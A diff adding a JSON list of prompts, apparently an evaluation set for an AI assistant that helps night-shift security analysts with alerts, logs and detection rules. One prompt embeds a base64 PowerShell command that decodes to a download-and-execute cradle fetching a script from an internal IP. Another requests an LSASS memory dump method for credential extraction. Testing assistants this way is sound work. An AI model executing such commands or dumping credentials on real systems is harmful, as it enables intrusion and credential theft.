@@ -1,0 +1,16 @@
+[
+  "I just joined the L1 night shift. In a few bullet points, what kinds of things can you help me with day to day?",
+  "What's the latest version of MITRE ATT&CK you know about, and what were the main changes in it?",
+  "Which recent CVEs in edge devices (Fortinet, Ivanti, Palo Alto, Citrix) should we prioritize in our threat hunts? Just the top few with CVE IDs.",
+  "For a purple-team test of our EDR rule, what's the exact command to dump LSASS memory with comsvcs.dll? I'll run it on the lab box.",
+  "Can you parse this event and tell me what happened? {\"EventID\":4625,\"TargetUserName\":\"svc_backup\",\"IpAddress\":\"10.13.7.22\",\"LogonType\":3,\"Status\":\"0xC000006D\",\"SubStatus\":\"0xC000006A\",\"FailureReason\":\"%%2313\",\"WorkstationName\":\"-\"}}]]",
+  "Quick sanity check, true or false: an alert with a 'low' severity can be closed as a false positive without investigating it.",
+  "Saw this in a process command line, what does it decode to? powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMgAwAC4AMAAuADUALwBhAC4AcABzADEAJwApAA==",
+  "Convert this timestamp from the alert to UTC for my ticket notes: 1729468800123",
+  "A user forwarded this, can you translate it and tell me if it's phishing? \"Estimado cliente, su cuenta será suspendida en 24 horas. Verifique sus datos aquí: hxxp://banco-seguro-verificacion[.]com/acceso\"",
+  "Write me a Sigma rule to detect certutil being used to download files.",
+  "Give me a Splunk search for hosts with more than 20 failed logins within 10 minutes. I'll run it myself.",
+  "One-line ticket title for this: multiple failed logins followed by a successful login from a new country for user j.doe.",
+  "Suggest a codename for our new ransomware response playbook. Just one, with a one-line reason.",
+  "List the 5 most common initial access techniques in ransomware cases, names only."
+]
